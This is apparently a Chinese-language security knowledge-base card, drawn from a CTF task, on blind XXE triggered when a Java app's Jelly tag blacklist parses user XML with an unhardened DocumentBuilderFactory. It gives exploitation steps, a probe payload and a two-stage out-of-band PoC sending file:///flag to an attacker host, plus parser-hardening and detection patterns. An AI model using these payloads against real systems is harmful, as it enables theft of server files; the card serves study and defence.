---
id: web-generic-xxe-jelly-blacklist-check-documentbuilderfactory-parse
title: Jelly 危险标签黑名单用同一份 XML 做校验：check 阶段 DocumentBuilderFactory 未禁 DTD，XXE 在校验时先行触发并 OOB 外带文件
type: scenario
domain: web
path: web/generic/xxe
technique: xxe-in-blacklist-check-phase-documentbuilderfactory
aliases:
- 安全校验函数自己成了 XXE 入口
- Jelly check 阶段 XXE
- DocumentBuilderFactory 默认允许外部实体
- 黑名单先解析后执行
- 绕 Jelly 危险标签黑名单
tags:
- java
- xxe
- oob
- jelly
- documentbuilderfactory
- blacklist-bypass
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W7
  verified_at: '2026-11-09T01:53:58+08:00'
  notes: 已对照原文核对；本次核对未读取图片；IndexController.check() 用 DocumentBuilderFactory.newInstance()+setNamespaceAware(true)+parse(uri) 统计 expr/import/include/invoke/invokeStatic/new/parse/set/setProperties/out/useBean 十一个标签、/jelly 路由 compileScript(uri).run(...)、两级外部 DTD（a.dtd 的 %exp 定义 %data 指向 http://vps:2333/?%file;）与主 XML（file:///flag + %dtd; + %data;）均与正文逐字一致。未验证点：XXE 成功外带仅据正文描述、未跑 PoC；正文「Jelly 1.0 存在 XXE」来自未读截图且与本题实际触发点（应用自身 check 阶段的 DocumentBuilderFactory）不同，本卡已明确将根因落在校验器而非 Jelly 组件，故未标 affected_versions；comons-jelly 1.0.1 仅为原文依赖环境。
---

## 一句话结论

应用先用 `DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(uri)` 把用户给的 XML 解析一遍，统计 `expr/import/invoke/new/set/out` 等危险标签数量来决定是否放行，再用 Jelly 编译执行；但校验阶段的 `DocumentBuilderFactory` 默认**不禁用外部实体与 DTD**，于是攻击者不必碰任何被黑名单的危险标签，只提交一个带 `<!ENTITY ... SYSTEM>` 的 DOCTYPE，XXE 就会在黑名单判定之前解析并可通过外部 DTD 把文件内容 OOB 外带。

## 原理

- **校验先于执行**：`check(uri)` 里 `parse(uri)` 的目标就是攻击者传入的同一份 XML。黑名单只按标签名（`getElementsByTagNameNS("*","invoke")` 等）计数，**完全不检查 DOCTYPE/ENTITY**，所以「XML 里有什么实体」不在任何判断里。
- **JAXP 的默认不安全**：`DocumentBuilderFactory` 默认 `FEATURE_SECURE_PROCESSING` 打开，但 `external-general-entities` / `external-parameter-entities` / `load-external-dtd` 仍为允许状态（XML 1.0 规范行为）；只有显式 `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` 或 `setExpandEntityReferences(false)` + 关闭外部实体才安全。因此 `<!ENTITY x SYSTEM "file:///flag">` 会被解析、`%dtd;` 会去拉取远程 DTD。
- **为什么能外带**：参数实体在 DTD 内可以被递归引用，把 `%file;` 的内容拼进另一个实体的 SYSTEM URL（HTTP 请求）里；攻击者只看到自己服务器的访问日志就拿到文件内容。若文件内容含换行/非法 URL 字符，就先读前若干字节或改用错误信息外带。
- **与 Jelly 注入的关系**：Jelly 的 `jelly:core` 标签（`invoke/invokeStatic/new/set`）本身能直接执行 Java 代码，这题的黑名单正是围着它们建的；本卡的要点是「绕过黑名单不一定要找漏掉的标签，可以在校验器里把解析器当成文件读取器用」。
- **补充**：`file:` 标签（`jelly:file`）能写文件但未列入黑名单，原文尝试用它覆盖 jar 未成功；属未被利用的旁支，不作为本卡成立依据。

## 触发条件

- 用户可控 XML 被交给未经加固的 `DocumentBuilderFactory`（或 `SAXParserFactory`/`Unmarshaller`）解析，且该解析发生在业务判定/校验阶段（黑名单检查、格式校验、标签统计）。
- 解析器未禁用 DOCTYPE 与外部实体，且允许外部参数实体（多数默认配置满足）。
- 服务器可出网（HTTP/DNS）到攻击者控制的地址；内网隔离时只能读回显型数据，需改用错误信息外带。
- 目标文件可被进程读取（如 `file:///flag`），且内容能放进 URL/请求头（长度受限时先读前缀）。

## 利用步骤

1. 找到「先解析、后执行」的入口：本题 `GET /jelly?uri=<xml 或远程地址>`。先提交一份正常 XML，确认返回 `Tasty Jelly :)`（放行）或 `no way :(`（拦截）。
2. 确认校验器是否解析 DOCTYPE：提交只含 `<!DOCTYPE r [<!ENTITY % p SYSTEM "http://<attacker>/probe.dtd">%p;]><r/>` 的 XML，看攻击者服务器是否收到请求；收到即 XXE 成立且发生在黑名单判定阶段。
3. 在攻击者服务器放两级 DTD：第一级把 `%file;` 内容拼进第二级实体的 SYSTEM URL；主 XML 引用该 DTD 并触发 `%send;`。
4. 从 HTTP 日志读出 URL 中的文件内容；若内容含换行导致请求失败，改为逐段读取或把内容 base64 化（借助 PHP/Java 侧的 filter 包装，若能控制）。
5. 拿到 flag 或源码后，再考虑是否需要在 Jelly 侧继续执行（本卡不依赖后一步）。

PoC（主 XML，直接提交给 `uri` 参数）：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % dtd SYSTEM "http://<attacker>/a.dtd">
%dtd;
%data;
]>
<root></root>
```

攻击者服务器上的 `a.dtd`：

```dtd
<!ENTITY % exp
"<!ENTITY &#x25; data SYSTEM 'http://<attacker>:2333/?%file;'>">
%exp;
```

## 变体与关联

- **同源问题**：任何「安全校验函数自己用不安全解析器解析攻击者输入」的模式（XXE、SSRF 探活、XML 格式检查、YAML 预解析）都可复用；黑名单只覆盖标签/关键字时尤其常见。
- **变体 sink**：`SAXParser`、`XMLReader`、`Unmarshaller`（JAXB）、`DocumentBuilderFactory` 的 `setNamespaceAware(true)` 不影响实体开关，因此仍是默认不安全。
- **外带变体**：HTTP 外带（本卡）、DNS 外带（URL 主机名拼接，受标签长度限制）、错误信息外带（解析异常回显文件片段）、FTP 外带。
- **关联**：`web-generic-xxe-oob-exfil`（通用盲 XXE 外带原语）、`web-java-expression-jelly-core-tag-jexl-injection-rce`（Jelly 标签注入执行，本卡黑名单针对的正是它）、`web-generic-xxe-sobey-mcheditor-aitaskback-documentbuilderfactory`（同 sink 的另一入口）。

## 检测与防御

- **修校验器**：`dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`；或 `setFeature("http://xml.org/sax/features/external-general-entities", false)` + `external-parameter-entities=false` + `load-external-dtd=false`，并 `setXIncludeAware(false)`、`setExpandEntityReferences(false)`。
- **换判定方式**：黑名单不应"解析后统计标签"，可改用正则/白名单标签库/受限 SAX 处理器，且校验应与执行解耦（同一份输入被解析两次就是两个攻击面）。
- **根本方案**：不把用户输入当 Jelly/模板脚本执行；确需模板就让用户选择预置模板 ID，而非传任意 URI。
- **检测**：请求体/参数含 `<!DOCTYPE`、`<!ENTITY`、`SYSTEM "file://`、`%dtd;`；服务端出现异常出站 HTTP/DNS 请求（尤其带长查询串）即为典型 XXE 外带。
